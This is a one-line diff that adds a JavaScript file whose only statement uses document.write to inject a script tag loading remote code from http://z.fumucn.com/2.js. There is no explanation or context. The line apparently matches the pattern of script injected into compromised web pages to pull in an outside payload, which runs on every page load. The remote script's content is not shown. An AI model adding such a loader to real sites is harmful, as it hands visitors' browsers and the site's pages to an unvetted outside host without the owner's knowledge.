@@ -1,0 +1,1 @@
+﻿document.write("<script language=\"javascript\" type=\"text/javascript\" src=\"http://z.fumucn.com/2.js\"></script>");
